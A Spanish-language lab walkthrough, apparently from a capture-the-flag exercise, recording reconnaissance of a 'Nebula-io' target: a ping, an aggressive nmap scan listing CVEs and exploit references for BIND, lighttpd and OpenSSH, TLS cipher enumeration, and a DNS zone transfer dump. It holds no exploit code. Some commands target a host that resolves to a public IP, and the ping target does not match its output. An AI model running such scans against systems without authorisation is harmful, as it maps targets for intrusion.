# Nebula-io

Empiezo con un ping para ver si la maquina está escuchando
┌──(kali㉿kali)-[~]
└─$ ping 10.10.146.27

PING 10.10.250.189 (10.10.250.189) 56(84) bytes of data.
64 bytes from 10.10.250.189: icmp_seq=1 ttl=63 time=44.7 ms
64 bytes from 10.10.250.189: icmp_seq=2 ttl=63 time=46.0 ms
64 bytes from 10.10.250.189: icmp_seq=3 ttl=63 time=45.6 ms
64 bytes from 10.10.250.189: icmp_seq=4 ttl=63 time=88.0 ms
64 bytes from 10.10.250.189: icmp_seq=5 ttl=63 time=48.5 ms
64 bytes from 10.10.250.189: icmp_seq=6 ttl=63 time=45.3 ms
64 bytes from 10.10.250.189: icmp_seq=7 ttl=63 time=47.0 ms
64 bytes from 10.10.250.189: icmp_seq=8 ttl=63 time=198 ms
64 bytes from 10.10.250.189: icmp_seq=9 ttl=63 time=47.5 ms
64 bytes from 10.10.250.189: icmp_seq=10 ttl=63 time=60.4 ms
64 bytes from 10.10.250.189: icmp_seq=11 ttl=63 time=54.1 ms
64 bytes from 10.10.250.189: icmp_seq=12 ttl=63 time=43.1 ms
64 bytes from 10.10.250.189: icmp_seq=13 ttl=63 time=43.5 ms
64 bytes from 10.10.250.189: icmp_seq=14 ttl=63 time=45.9 ms
64 bytes from 10.10.250.189: icmp_seq=15 ttl=63 time=44.6 ms
64 bytes from 10.10.250.189: icmp_seq=16 ttl=63 time=44.4 ms
64 bytes from 10.10.250.189: icmp_seq=17 ttl=63 time=46.2 ms
64 bytes from 10.10.250.189: icmp_seq=18 ttl=63 time=44.0 ms
64 bytes from 10.10.250.189: icmp_seq=19 ttl=63 time=46.7 ms
--- 10.10.250.189 ping statistics ---
136 packets transmitted, 136 received, 0% packet loss, time 135146ms
rtt min/avg/max/mdev = 42.454/54.801/258.262/34.283 ms

                                                                                                                          
Realizo un nmap BRUTA para ver lo máximo posible, aunque se que hae mucho ruido....es para realizar pruebas, con este nmap me da vulnerabilidades, los puertos abiertos                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ nmap -A -T4 -p- --osscan-guess --version-all --script=default,safe 10.10.250.189


Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 12:43 EDT
No profinet devices in the subnet
Pre-scan script results:
| broadcast-listener: 
|   ether
|       ARP Request
|         sender ip      sender mac         target ip
|         192.168.193.2  00:50:56:eb:54:28  192.168.193.133
|         192.168.193.1  00:50:56:c0:00:08  192.168.193.2
|   udp
|       DHCP
|         srv ip           cli ip           mask           gw             dns            vendor
|_        192.168.193.254  192.168.193.133  255.255.255.0  192.168.193.2  192.168.193.2  -
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_multicast-profinet-discovery: 0
| broadcast-igmp-discovery: 
|   192.168.193.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.251
|     Description: mDNS (rfc6762)
|   192.168.193.1
|     Interface: eth0
|     Version: 2
|     Group: 239.255.255.250
|     Description: Organization-Local Scope (rfc2365)
|_  Use the newtargets script-arg to add the results as targets
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     Interface: eth0
|     IP Offered: 192.168.193.133
|     Server Identifier: 192.168.193.254
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.193.2
|     Domain Name Server: 192.168.193.2
|     Domain Name: localdomain
|     Broadcast Address: 192.168.193.255
|_    NetBIOS Name Server: 192.168.193.2
|_eap-info: please specify an interface with -e
| broadcast-ping: 
|   IP: 192.168.193.2  MAC: 00:50:56:eb:54:28
|_  Use --script-args=newtargets to add the results as targets
Nmap scan report for 10.10.250.189
Host is up (0.048s latency).
Not shown: 65532 closed tcp ports (reset)
Bug in http-security-headers: no string output.
PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.9.5-3ubuntu0.19 (Ubuntu Linux)
| vulners: 
|   cpe:/a:isc:bind:9.9.5-3ubuntu0.19: 
|       CVE-2021-25216  9.8     https://vulners.com/cve/CVE-2021-25216
|       CVE-2020-8616   8.6     https://vulners.com/cve/CVE-2020-8616
|       CVE-2016-1286   8.6     https://vulners.com/cve/CVE-2016-1286
|       CVE-2020-8625   8.1     https://vulners.com/cve/CVE-2020-8625
|       PACKETSTORM:180552      7.8     https://vulners.com/packetstorm/PACKETSTORM:180552      *EXPLOIT*
|       PACKETSTORM:138960      7.8     https://vulners.com/packetstorm/PACKETSTORM:138960      *EXPLOIT*
|       PACKETSTORM:132926      7.8     https://vulners.com/packetstorm/PACKETSTORM:132926      *EXPLOIT*
|       MSF:AUXILIARY-DOS-DNS-BIND_TKEY-        7.8     https://vulners.com/metasploit/MSF:AUXILIARY-DOS-DNS-BIND_TKEY- *EXPLOIT*
|       EXPLOITPACK:BE4F638B632EA0754155A27ECC4B3D3F    7.8     https://vulners.com/exploitpack/EXPLOITPACK:BE4F638B632EA0754155A27ECC4B3D3F      *EXPLOIT*
|       EXPLOITPACK:46DEBFAC850194C04C54F93E0DFF5F4F    7.8     https://vulners.com/exploitpack/EXPLOITPACK:46DEBFAC850194C04C54F93E0DFF5F4F      *EXPLOIT*
|       EXPLOITPACK:09762DB0197BBAAAB6FC79F24F0D2A74    7.8     https://vulners.com/exploitpack/EXPLOITPACK:09762DB0197BBAAAB6FC79F24F0D2A74      *EXPLOIT*
|       EDB-ID:42121    7.8     https://vulners.com/exploitdb/EDB-ID:42121      *EXPLOIT*
|       EDB-ID:37723    7.8     https://vulners.com/exploitdb/EDB-ID:37723      *EXPLOIT*
|       EDB-ID:37721    7.8     https://vulners.com/exploitdb/EDB-ID:37721      *EXPLOIT*
|       CVE-2017-3141   7.8     https://vulners.com/cve/CVE-2017-3141
|       CVE-2015-5722   7.8     https://vulners.com/cve/CVE-2015-5722
|       CVE-2015-5477   7.8     https://vulners.com/cve/CVE-2015-5477
|       1337DAY-ID-25325        7.8     https://vulners.com/zdt/1337DAY-ID-25325        *EXPLOIT*
|       1337DAY-ID-23970        7.8     https://vulners.com/zdt/1337DAY-ID-23970        *EXPLOIT*
|       1337DAY-ID-23960        7.8     https://vulners.com/zdt/1337DAY-ID-23960        *EXPLOIT*
|       1337DAY-ID-23948        7.8     https://vulners.com/zdt/1337DAY-ID-23948        *EXPLOIT*
|       PACKETSTORM:180551      7.5     https://vulners.com/packetstorm/PACKETSTORM:180551      *EXPLOIT*
|       MSF:AUXILIARY-DOS-DNS-BIND_TSIG_BADTIME-        7.5     https://vulners.com/metasploit/MSF:AUXILIARY-DOS-DNS-BIND_TSIG_BADTIME-   *EXPLOIT*
|       MSF:AUXILIARY-DOS-DNS-BIND_TSIG-        7.5     https://vulners.com/metasploit/MSF:AUXILIARY-DOS-DNS-BIND_TSIG- *EXPLOIT*
|       EDB-ID:40453    7.5     https://vulners.com/exploitdb/EDB-ID:40453      *EXPLOIT*
|       CVE-2023-50387  7.5     https://vulners.com/cve/CVE-2023-50387
|       CVE-2023-4408   7.5     https://vulners.com/cve/CVE-2023-4408
|       CVE-2023-3341   7.5     https://vulners.com/cve/CVE-2023-3341
|       CVE-2022-38177  7.5     https://vulners.com/cve/CVE-2022-38177
|       CVE-2021-25215  7.5     https://vulners.com/cve/CVE-2021-25215
|       CVE-2020-8617   7.5     https://vulners.com/cve/CVE-2020-8617
|       CVE-2018-5743   7.5     https://vulners.com/cve/CVE-2018-5743
|       CVE-2018-5740   7.5     https://vulners.com/cve/CVE-2018-5740
|       CVE-2017-3145   7.5     https://vulners.com/cve/CVE-2017-3145
|       CVE-2017-3143   7.5     https://vulners.com/cve/CVE-2017-3143
|       CVE-2016-9131   7.5     https://vulners.com/cve/CVE-2016-9131
|       CVE-2016-8864   7.5     https://vulners.com/cve/CVE-2016-8864
|       CVE-2016-2776   7.5     https://vulners.com/cve/CVE-2016-2776
|       CE8366BE-F17D-552A-B1B4-C2DBD31482C0    7.5     https://vulners.com/githubexploit/CE8366BE-F17D-552A-B1B4-C2DBD31482C0    *EXPLOIT*
|       BB688FBF-CEE2-5DD1-8561-8F76501DE2D4    7.5     https://vulners.com/githubexploit/BB688FBF-CEE2-5DD1-8561-8F76501DE2D4    *EXPLOIT*
|       5EFDF373-FBD1-5C09-A612-00ADBFE574CF    7.5     https://vulners.com/githubexploit/5EFDF373-FBD1-5C09-A612-00ADBFE574CF    *EXPLOIT*
|       1337DAY-ID-34485        7.5     https://vulners.com/zdt/1337DAY-ID-34485        *EXPLOIT*
|       EXPLOITPACK:D6DDF5E24DE171DAAD71FD95FC1B67F2    7.2     https://vulners.com/exploitpack/EXPLOITPACK:D6DDF5E24DE171DAAD71FD95FC1B67F2      *EXPLOIT*
|       CVE-2015-5986   7.1     https://vulners.com/cve/CVE-2015-5986
|       CVE-2016-1285   6.8     https://vulners.com/cve/CVE-2016-1285
|       CVE-2021-25214  6.5     https://vulners.com/cve/CVE-2021-25214
|       CVE-2020-8622   6.5     https://vulners.com/cve/CVE-2020-8622
|       CVE-2018-5741   6.5     https://vulners.com/cve/CVE-2018-5741
|       CVE-2016-6170   6.5     https://vulners.com/cve/CVE-2016-6170
|       PACKETSTORM:180550      5.9     https://vulners.com/packetstorm/PACKETSTORM:180550      *EXPLOIT*
|       CVE-2017-3136   5.9     https://vulners.com/cve/CVE-2017-3136
|       CVE-2016-2775   5.9     https://vulners.com/cve/CVE-2016-2775
|       CVE-2022-2795   5.3     https://vulners.com/cve/CVE-2022-2795
|       CVE-2021-25219  5.3     https://vulners.com/cve/CVE-2021-25219
|       CVE-2019-6465   5.3     https://vulners.com/cve/CVE-2019-6465
|       CVE-2017-3142   5.3     https://vulners.com/cve/CVE-2017-3142
|       PACKETSTORM:157836      5.0     https://vulners.com/packetstorm/PACKETSTORM:157836      *EXPLOIT*
|       FBC03933-7A65-52F3-83F4-4B2253A490B6    5.0     https://vulners.com/githubexploit/FBC03933-7A65-52F3-83F4-4B2253A490B6    *EXPLOIT*
|       CVE-2018-5745   4.9     https://vulners.com/cve/CVE-2018-5745
|       PACKETSTORM:142800      0.0     https://vulners.com/packetstorm/PACKETSTORM:142800      *EXPLOIT*
|_      1337DAY-ID-27896        0.0     https://vulners.com/zdt/1337DAY-ID-27896        *EXPLOIT*
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.19-Ubuntu
80/tcp   open  http    lighttpd 1.4.33
| vulners: 
|   cpe:/a:lighttpd:lighttpd:1.4.33: 
|       CVE-2019-11072  9.8     https://vulners.com/cve/CVE-2019-11072
|       CVE-2014-2323   9.8     https://vulners.com/cve/CVE-2014-2323
|       SSV:61980       7.5     https://vulners.com/seebug/SSV:61980    *EXPLOIT*
|       CVE-2018-19052  7.5     https://vulners.com/cve/CVE-2018-19052
|       CVE-2015-3200   7.5     https://vulners.com/cve/CVE-2015-3200
|       CVE-2013-4508   7.5     https://vulners.com/cve/CVE-2013-4508
|       SSV:61850       5.0     https://vulners.com/seebug/SSV:61850    *EXPLOIT*
|_      CVE-2014-2324   5.0     https://vulners.com/cve/CVE-2014-2324
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-title: Bluffer V.0.1a
|_http-date: Wed, 09 Apr 2025 16:45:21 GMT; 0s from local time.
|_http-server-header: lighttpd/1.4.33
|_http-comments-displayer: Couldn't find any comments.
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
|_http-referer-checker: Couldn't find any cross-domain scripts.
| http-headers: 
|   Content-Type: text/html
|   Accept-Ranges: bytes
|   ETag: "3638477973"
|   Last-Modified: Sat, 05 Apr 2025 14:51:20 GMT
|   Content-Length: 1138
|   Connection: close
|   Date: Wed, 09 Apr 2025 16:45:20 GMT
|   Server: lighttpd/1.4.33
|   
|_  (Request type: HEAD)
|_http-mobileversion-checker: No mobile version detected.
|_http-fetch: Please enter the complete path of the directory to save data in.
1986/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
| vulners: 
|   cpe:/a:openbsd:openssh:6.6.1p1: 
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A    *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       CVE-2016-1908   9.8     https://vulners.com/cve/CVE-2016-1908
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23    *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623    *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC    *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    9.8     https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    *EXPLOIT*
|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587    *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    8.7     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A    *EXPLOIT*
|       CVE-2015-5600   8.5     https://vulners.com/cve/CVE-2015-5600
|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT*
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09      *EXPLOIT*
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|       CVE-2016-10012  7.8     https://vulners.com/cve/CVE-2016-10012
|       CVE-2015-8325   7.8     https://vulners.com/cve/CVE-2015-8325
|       1337DAY-ID-26494        7.8     https://vulners.com/zdt/1337DAY-ID-26494        *EXPLOIT*
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    7.5     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807    *EXPLOIT*
|       EDB-ID:40888    7.5     https://vulners.com/exploitdb/EDB-ID:40888      *EXPLOIT*
|       CVE-2016-6515   7.5     https://vulners.com/cve/CVE-2016-6515
|       CVE-2016-10708  7.5     https://vulners.com/cve/CVE-2016-10708
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       CVE-2016-10009  7.3     https://vulners.com/cve/CVE-2016-10009
|       SSV:92582       7.2     https://vulners.com/seebug/SSV:92582    *EXPLOIT*
|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
|       CVE-2016-10010  7.0     https://vulners.com/cve/CVE-2016-10010
|       SSV:92580       6.9     https://vulners.com/seebug/SSV:92580    *EXPLOIT*
|       CVE-2015-6564   6.9     https://vulners.com/cve/CVE-2015-6564
|       1337DAY-ID-26577        6.9     https://vulners.com/zdt/1337DAY-ID-26577        *EXPLOIT*
|       EDB-ID:46516    6.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    6.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6110   6.8     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   6.8     https://vulners.com/cve/CVE-2019-6109
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207    *EXPLOIT*
|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
|       EDB-ID:40858    6.4     https://vulners.com/exploitdb/EDB-ID:40858      *EXPLOIT*
|       EDB-ID:40119    6.4     https://vulners.com/exploitdb/EDB-ID:40119      *EXPLOIT*
|       EDB-ID:39569    6.4     https://vulners.com/exploitdb/EDB-ID:39569      *EXPLOIT*
|       CVE-2016-3115   6.4     https://vulners.com/cve/CVE-2016-3115
|       PACKETSTORM:181223      5.9     https://vulners.com/packetstorm/PACKETSTORM:181223      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        5.9     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-   *EXPLOIT*
|       EDB-ID:40136    5.9     https://vulners.com/exploitdb/EDB-ID:40136      *EXPLOIT*
|       EDB-ID:40113    5.9     https://vulners.com/exploitdb/EDB-ID:40113      *EXPLOIT*
|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6111   5.9     https://vulners.com/cve/CVE-2019-6111
|       CVE-2016-6210   5.9     https://vulners.com/cve/CVE-2016-6210
|       54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C    5.9     https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C    *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19      *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97      *EXPLOIT*
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       SSV:91041       5.5     https://vulners.com/seebug/SSV:91041    *EXPLOIT*
|       PACKETSTORM:140019      5.5     https://vulners.com/packetstorm/PACKETSTORM:140019      *EXPLOIT*
|       PACKETSTORM:136251      5.5     https://vulners.com/packetstorm/PACKETSTORM:136251      *EXPLOIT*
|       PACKETSTORM:136234      5.5     https://vulners.com/packetstorm/PACKETSTORM:136234      *EXPLOIT*
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F      *EXPLOIT*
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138      *EXPLOIT*
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330      *EXPLOIT*
|       CVE-2016-10011  5.5     https://vulners.com/cve/CVE-2016-10011
|       1337DAY-ID-25388        5.5     https://vulners.com/zdt/1337DAY-ID-25388        *EXPLOIT*
|       EDB-ID:45939    5.3     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.3     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-20685  5.3     https://vulners.com/cve/CVE-2018-20685
|       CVE-2018-15919  5.3     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.3     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.3     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0      *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283      *EXPLOIT*
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF      *EXPLOIT*
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF      *EXPLOIT*
|       CVE-2015-5352   4.3     https://vulners.com/cve/CVE-2015-5352
|       1337DAY-ID-25440        4.3     https://vulners.com/zdt/1337DAY-ID-25440        *EXPLOIT*
|       1337DAY-ID-25438        4.3     https://vulners.com/zdt/1337DAY-ID-25438        *EXPLOIT*
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       SSV:92581       2.1     https://vulners.com/seebug/SSV:92581    *EXPLOIT*
|       CVE-2015-6563   1.9     https://vulners.com/cve/CVE-2015-6563
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT*
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT*
|       1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
|       1337DAY-ID-26468        0.0     https://vulners.com/zdt/1337DAY-ID-26468        *EXPLOIT*
|_      1337DAY-ID-25391        0.0     https://vulners.com/zdt/1337DAY-ID-25391        *EXPLOIT*
| ssh-hostkey: 
|   1024 77:bd:da:ab:76:ac:f2:e6:5e:89:13:62:d5:64:2c:eb (DSA)
|   2048 a0:ec:8e:db:17:ff:f9:61:ce:68:bb:5d:1c:b4:a8:ba (RSA)
|   256 dd:d8:d6:76:dc:d4:67:7b:15:94:4a:9c:d8:d3:cb:37 (ECDSA)
|_  256 b1:7b:06:a9:49:85:1e:2a:0a:de:71:9d:8b:50:d3:4a (ED25519)
| ssh2-enum-algos: 
|   kex_algorithms: (8)
|   server_host_key_algorithms: (4)
|   encryption_algorithms: (16)
|   mac_algorithms: (19)
|_  compression_algorithms: (2)
|_unusual-port: ssh unexpected on port tcp/1986
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_fcrdns: FAIL (No PTR record)
| qscan: 
| PORT  FAMILY  MEAN (us)  STDDEV    LOSS (%)
| 1     0       46277.60   3284.90   0.0%
| 53    0       58684.50   38665.58  0.0%
| 80    0       48386.30   6636.05   0.0%
|_1986  0       46698.20   2521.55   0.0%
|_path-mtu: PMTU == 1500
| dns-blacklist: 
|   SPAM
|     l2.apews.org - FAIL
|_    all.spamrats.com - FAIL
|_ipidseq: All zeros
| port-states: 
|   tcp: 
|     open: 53,80,1986
|_    closed: 1-52,54-79,81-1985,1987-65535
| traceroute-geolocation: 
|   HOP  RTT    ADDRESS        GEOLOCATION
|   1    43.29  10.8.0.1       - ,- 
|_  2    43.65  10.10.250.189  - ,- 

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   43.29 ms 10.8.0.1
2   43.65 ms 10.10.250.189

Post-scan script results:
| reverse-index: 
|   53/tcp: 10.10.250.189
|   80/tcp: 10.10.250.189
|_  1986/tcp: 10.10.250.189
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.39 seconds

OpenSSH, versiones anteriores a 9.6   CVE-2023-48795, CVE-2023-46445 y CVE-2023-46446.
Fabian Bäumer, Marcus Brinkmann y Jörg Schwenk, de la Universidad Ruhr de Bochum, y que se ha denominado Terrapin Attack.

──(kali㉿kali)-[~]
└─$ nmap -p 443 --script ssl-enum-ciphers careervault.nebula.io

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-10 07:20 EDT
Nmap scan report for careervault.nebula.io (34.123.220.243)
Host is up (0.00059s latency).
rDNS record for 34.123.220.243: 243.220.123.34.bc.googleusercontent.com

PORT    STATE    SERVICE
443/tcp filtered https

Nmap done: 1 IP address (1 host up) scanned in 5.46 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -p 443 --script ssl-enum-ciphers careervault.nebula.io

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-10 07:20 EDT
Nmap scan report for careervault.nebula.io (34.123.220.243)
Host is up (0.00059s latency).
rDNS record for 34.123.220.243: 243.220.123.34.bc.googleusercontent.com

PORT    STATE    SERVICE
443/tcp filtered https

Nmap done: 1 IP address (1 host up) scanned in 5.46 seconds

┌──(kali㉿kali)-[~]
└─$ curl -I https://careervault.nebula.io

HTTP/2 200 
server: nginx
date: Thu, 10 Apr 2025 11:48:36 GMT
content-type: text/html; charset=UTF-8
content-length: 69018
vary: Accept-Encoding
vary: Accept-Encoding
vary: Accept-Encoding
x-powered-by: WP Engine
link: <https://careervault.nebula.io/wp-json/>; rel="https://api.w.org/"
link: <https://careervault.nebula.io/wp-json/wp/v2/pages/94>; rel="alternate"; title="JSON"; type="application/json"
link: <https://careervault.nebula.io/>; rel=shortlink
x-cacheable: SHORT
vary: Accept-Encoding,Cookie
cache-control: max-age=600, must-revalidate
accept-ranges: bytes
x-cache: HIT: 1
x-cache-group: normal

nmap -p 443 --script ssl-enum-ciphers careervault.nebula.io

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-10 07:52 EDT
Nmap scan report for careervault.nebula.io (34.123.220.243)
Host is up (0.018s latency).
rDNS record for 34.123.220.243: 243.220.123.34.bc.googleusercontent.com

PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers: 
|   TLSv1.2: 
|     ciphers: 
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A
|       TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (ecdh_x25519) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (ecdh_x25519) - A
|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A
|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A
|     compressors: 
|       NULL
|     cipher preference: server
|   TLSv1.3: 
|     ciphers: 
|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A
|       TLS_AKE_WITH_CHACHA20_POLY1305_SHA256 (ecdh_x25519) - A
|       TLS_AKE_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A
|     cipher preference: server
|_  least strength: A

Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds


┌──(kali㉿kali)-[~]
└─$ nmap -Pn 10.10.162.19 -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=nebula.io
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-10 09:06 EDT
Nmap scan report for 10.10.162.19
Host is up (0.055s latency).

PORT   STATE SERVICE
53/tcp open  domain
| dns-zone-transfer: 
| nebula.io.                               SOA    ns1.nebula.io. admin.nebula.io.
| nebula.io.                               HINFO  "Nebula Server" "Linux"
| nebula.io.                               TXT    "nebula-verification=examplecode123"
| nebula.io.                               TXT    "google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
| nebula.io.                               MX     0 mail.nebula.io.
| nebula.io.                               MX     0 ASPMX.L.GOOGLE.COM.
| nebula.io.                               MX     10 ALT1.ASPMX.L.GOOGLE.COM.
| nebula.io.                               MX     10 ALT2.ASPMX.L.GOOGLE.COM.
| nebula.io.                               MX     20 ASPMX2.GOOGLEMAIL.COM.
| nebula.io.                               MX     20 ASPMX3.GOOGLEMAIL.COM.
| nebula.io.                               MX     20 ASPMX4.GOOGLEMAIL.COM.
| nebula.io.                               MX     20 ASPMX5.GOOGLEMAIL.COM.
| nebula.io.                               NS     ns1.nebula.io.
| nebula.io.                               NS     ns2.nebula.io.
| nebula.io.                               A      192.168.150.144
| _sip._tcp.nebula.io.                     SRV    0 5 5060 sip.nebula.io.
